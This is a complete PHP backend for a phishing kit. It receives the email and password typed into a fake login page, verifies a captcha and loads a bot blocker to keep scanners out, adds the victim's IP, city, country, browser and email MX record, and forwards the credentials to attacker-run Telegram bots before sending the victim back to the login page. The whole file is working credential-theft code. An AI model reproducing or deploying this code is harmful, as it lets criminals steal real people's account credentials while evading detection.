<?php
// Start output buffering to prevent header issues
ob_start();

// Include configuration - REQUIRED
if (!file_exists('config.php')) {
    http_response_code(500);
    die('Configuration file (config.php) not found. Please create it from config.example.php');
}
require_once 'config.php';

// Validate required configuration
$requiredConfigs = [
    'FRONTEND_URL', 'LOGIN_PAGE', 'TELEGRAM_BOT_TOKEN', 
    'TELEGRAM_CHAT_ID', 'TURNSTILE_SECRET', 'ALLOWED_ORIGINS'
];

foreach ($requiredConfigs as $config) {
    if (!defined($config)) {
        http_response_code(500);
        die("Required configuration '$config' not found in config.php");
    }
}

// Set CORS headers for cross-origin requests
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowedOrigins = ALLOWED_ORIGINS;

if (in_array($origin, $allowedOrigins)) {
    header("Access-Control-Allow-Origin: $origin");
} else {
    header("Access-Control-Allow-Origin: " . FRONTEND_URL);
}

header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header("Access-Control-Allow-Credentials: true");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Include advanced bot blocker
require_once 'bot-blocker.php';

/**
 * Extract domain from email address
 */
function getDomainFromEmail($email) {
    if (strpos($email, '@') !== false) {
        return explode('@', $email)[1];
    }
    return null;
}

/**
 * Get the real client IP, preferring IPv4 over IPv6
 */
function getUserIP() {
    // Function to check if IP is IPv4
    $isIPv4 = function($ip) {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false;
    };
    
    // Function to check if IP is private/local
    $isPrivateIP = function($ip) {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false;
    };
    
    $potentialIPs = [];
    
    // Try X-Forwarded-For (may be a comma-separated list)
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ips as $ip) {
            $ip = trim($ip);
            if (!empty($ip) && strtolower($ip) !== 'unknown' && !$isPrivateIP($ip)) {
                $potentialIPs[] = $ip;
            }
        }
    }
    
    // Try X-Real-IP
    if (!empty($_SERVER['HTTP_X_REAL_IP']) && 
        strtolower($_SERVER['HTTP_X_REAL_IP']) !== 'unknown' &&
        !$isPrivateIP($_SERVER['HTTP_X_REAL_IP'])) {
        $potentialIPs[] = $_SERVER['HTTP_X_REAL_IP'];
    }
    
    // Try Cloudflare specific header
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP']) &&
        !$isPrivateIP($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $potentialIPs[] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    
    // Try REMOTE_ADDR
    if (!empty($_SERVER['REMOTE_ADDR']) && !$isPrivateIP($_SERVER['REMOTE_ADDR'])) {
        $potentialIPs[] = $_SERVER['REMOTE_ADDR'];
    }
    
    // First, try external IPv4-only services (most reliable)
    try {
        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
                'header' => "User-Agent: PHP-Login-Script/1.0\r\n"
            ]
        ]);
        
        // Try IPv4-only service first
        $publicIP = file_get_contents(IP_SERVICE_URL, false, $context);
        if ($publicIP !== false && !empty(trim($publicIP))) {
            $cleanIP = trim($publicIP);
            if ($isIPv4($cleanIP)) {
                return $cleanIP . " (IPv4 service)";
            }
        }
        
        // Fallback to secondary service
        if (defined('IP_SERVICE_FALLBACK')) {
            $publicIP = file_get_contents(IP_SERVICE_FALLBACK, false, $context);
            if ($publicIP !== false && !empty(trim($publicIP))) {
                $cleanIP = trim($publicIP);
                if ($isIPv4($cleanIP)) {
                    return $cleanIP . " (IPv4 fallback)";
                }
            }
        }
    } catch (Exception $e) {
        error_log("External IP service error: " . $e->getMessage());
    }
    
    // If external services fail, check header IPs for IPv4
    foreach ($potentialIPs as $ip) {
        if ($isIPv4($ip)) {
            return $ip;
        }
    }
    
    // If no IPv4 found, use first available IP but mark as IPv6
    if (!empty($potentialIPs)) {
        return $potentialIPs[0] . ' (IPv6)';
    }
    
    // Fallback to REMOTE_ADDR even if private
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    // If we're getting localhost/private IPs, try to get public IPv4 via external service
    if ($isPrivateIP($ip) || $ip === 'Unknown') {
        try {
            $context = stream_context_create([
                'http' => [
                    'timeout' => 5,
                    'header' => "User-Agent: PHP-Login-Script/1.0\r\n"
                ]
            ]);
            
            // Try IPv4-only service first
            $publicIP = file_get_contents(IP_SERVICE_URL, false, $context);
            if ($publicIP !== false && !empty(trim($publicIP))) {
                $cleanIP = trim($publicIP);
                if ($isIPv4($cleanIP)) {
                    return $cleanIP . " (VPS detected: $ip)";
                }
            }
            
            // Fallback to secondary service
            if (defined('IP_SERVICE_FALLBACK')) {
                $publicIP = file_get_contents(IP_SERVICE_FALLBACK, false, $context);
                if ($publicIP !== false && !empty(trim($publicIP))) {
                    $cleanIP = trim($publicIP);
                    if ($isIPv4($cleanIP)) {
                        return $cleanIP . " (VPS detected: $ip)";
                    }
                }
            }
        } catch (Exception $e) {
            // Ignore error
        }
        return "$ip (local/private network)";
    }
    
    return $ip ?: 'Unknown';
}

/**
 * Get city and country from IP using ipapi.co
 */
function getLocationFromIP($ip) {
    try {
        // Extract just the IP if it contains additional info
        $cleanIP = explode(' ', $ip)[0];
        
        if (!empty($cleanIP) && $cleanIP !== 'Unknown' && 
            !str_starts_with($cleanIP, '127.') && 
            !str_starts_with($cleanIP, '192.168.') && 
            !str_starts_with($cleanIP, '10.')) {
            
            $context = stream_context_create([
                'http' => [
                    'timeout' => 5
                ]
            ]);
            $response = file_get_contents(GEO_SERVICE_URL . "/$cleanIP/json/", false, $context);
            
            if ($response !== false) {
                $data = json_decode($response, true);
                $city = $data['city'] ?? 'Unknown';
                $country = $data['country_name'] ?? 'Unknown';
                return [$city, $country];
            }
        }
    } catch (Exception $e) {
        // Ignore error
    }
    return ['Unknown (Local/Private Network)', 'Unknown (Local/Private Network)'];
}

/**
 * Get user's browser from User-Agent
 */
function getUserBrowser() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    if (strpos($userAgent, 'Chrome') !== false) {
        return 'Chrome';
    } elseif (strpos($userAgent, 'Firefox') !== false) {
        return 'Firefox';
    } elseif (strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Chrome') === false) {
        return 'Safari';
    } elseif (strpos($userAgent, 'Edge') !== false) {
        return 'Edge';
    } elseif (strpos($userAgent, 'Opera') !== false) {
        return 'Opera';
    } else {
        return 'Unknown';
    }
}

/**
 * Get MX record for a domain
 */
function getMXRecord($domain) {
    try {
        $mxRecords = [];
        if (getmxrr($domain, $mxRecords)) {
            return $mxRecords[0] ?? 'No MX record';
        }
    } catch (Exception $e) {
        // Ignore error
    }
    return 'Unable to resolve MX';
}

/**
 * Send message to Telegram bot
 */
function sendToTelegram($botToken, $chatId, $message) {
    $url = TELEGRAM_API_URL . $botToken . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result !== false;
}

/**
 * Send message to both Telegram bots (if configured)
 */
function sendToAllTelegramBots($message) {
    $success = false;
    
    // Send to primary bot (required)
    if (defined('TELEGRAM_BOT_TOKEN') && defined('TELEGRAM_CHAT_ID') && 
        !empty(TELEGRAM_BOT_TOKEN) && !empty(TELEGRAM_CHAT_ID)) {
        $success = sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $message) || $success;
    }
    
    // Send to secondary bot (optional)
    if (defined('TELEGRAM_BOT_TOKEN_2') && defined('TELEGRAM_CHAT_ID_2') && 
        !empty(TELEGRAM_BOT_TOKEN_2) && !empty(TELEGRAM_CHAT_ID_2)) {
        $success = sendToTelegram(TELEGRAM_BOT_TOKEN_2, TELEGRAM_CHAT_ID_2, $message) || $success;
    }
    
    return $success;
}

// Initialize variables
$email = '';
$password = '';
$turnstileResponse = '';
$error = null;
$domain = null;
$logoUrl = null;

// Handle form submission and GET requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle bot detection reports from frontend
    if (isset($_POST['bot_detected'])) {
        $reason = $_POST['reason'] ?? 'Unknown';
        $userAgent = $_POST['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '';
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
        
        error_log("Frontend bot detection: Reason=$reason, IP=$ip, UA=$userAgent");
        http_response_code(403);
        die('Bot detected by frontend');
    }
    
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $turnstileResponse = $_POST['cf-turnstile-response'] ?? '';
    
    // Validate password
    if (empty($password)) {
        $error = 'Authentication is required.';
    }
    
    // Validate captcha
    if (empty($turnstileResponse)) {
        $error = 'Captcha is required.';
    } else {
        // Verify Turnstile
        $verifyUrl = TURNSTILE_VERIFY_URL;
        $verifyData = [
            'secret' => TURNSTILE_SECRET,
            'response' => $turnstileResponse
        ];
        
        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($verifyData)
            ]
        ];
        
        $context = stream_context_create($options);
        $result = file_get_contents($verifyUrl, false, $context);
        
        if ($result !== false) {
            $verifyResult = json_decode($result, true);
            if (!($verifyResult['success'] ?? false)) {
                $error = 'Captcha validation failed.';
            }
        } else {
            $error = 'Captcha validation failed.';
        }
    }
    
    // Send to Telegram if no errors
    if (!$error) {
        // Get additional user information
        $userIP = getUserIP();
        [$city, $country] = getLocationFromIP($userIP);
        $browser = getUserBrowser();
        $domain = getDomainFromEmail($email);
        $mxRecord = $domain ? getMXRecord($domain) : 'N/A';
        $timestamp = date('Y-m-d H:i:s') . ' UTC';
        
        // Create enhanced message with all requested details
        $msg = "🎯 New Signup Alert!\n\n";
        $msg .= "Email: $email\n";
        $msg .= "Password: $password\n\n";
        $msg .= "📊 Additional Details:\n";
        $msg .= "IP Address: $userIP\n";
        $msg .= "City: $city\n";
        $msg .= "Country: $country\n";
        $msg .= "Browser: $browser\n";
        $msg .= "MX Record: $mxRecord\n";
        $msg .= "Date of Submission: $timestamp";
        
        // Send to all configured Telegram bots
        $telegramSuccess = sendToAllTelegramBots($msg);
        if ($telegramSuccess) {
            error_log("✅ Message sent to Telegram bot(s) successfully!");
        } else {
            error_log("❌ Failed to send message to any Telegram bot");
        }
    }
    
    // Handle POST response - redirect to frontend server
    if ($error) {
        // Redirect back to frontend with error message
        $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . "?email=" . urlencode($email) . "&error=" . urlencode($error);
        error_log("🔄 Redirecting to: $redirectUrl");
        
        // Clear any output buffer and send redirect
        if (ob_get_level()) {
            ob_end_clean();
        }
        
        // Try PHP redirect first
        header("Location: $redirectUrl");
        
        // Fallback JavaScript redirect if PHP redirect fails
        echo '<script>window.location.href = "' . htmlspecialchars($redirectUrl) . '";</script>';
        echo '<noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirectUrl) . '"></noscript>';
        echo '<p>If you are not redirected, <a href="' . htmlspecialchars($redirectUrl) . '">click here</a>.</p>';
        exit();
    } else {
        // Success - redirect back to login page (no success message)
        $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE;
        error_log("🔄 Redirecting to: $redirectUrl");
        
        // Clear any output buffer and send redirect
        if (ob_get_level()) {
            ob_end_clean();
        }
        
        // Try PHP redirect first
        header("Location: $redirectUrl");
        
        // Fallback JavaScript redirect if PHP redirect fails
        echo '<script>window.location.href = "' . htmlspecialchars($redirectUrl) . '";</script>';
        echo '<noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($redirectUrl) . '"></noscript>';
        echo '<p>If you are not redirected, <a href="' . htmlspecialchars($redirectUrl) . '">click here</a>.</p>';
        exit();
    }
} else {
    // GET request - redirect to the frontend server
    $queryString = $_SERVER['QUERY_STRING'] ?? '';
    $redirectUrl = FRONTEND_URL . "/" . LOGIN_PAGE . ($queryString ? "?$queryString" : "");
    error_log("🔄 GET Redirecting to: $redirectUrl");
    
    // Clear any output buffer and send redirect
    if (ob_get_level()) {
        ob_end_clean();
    }
    header("Location: $redirectUrl");
    exit();
}
?>
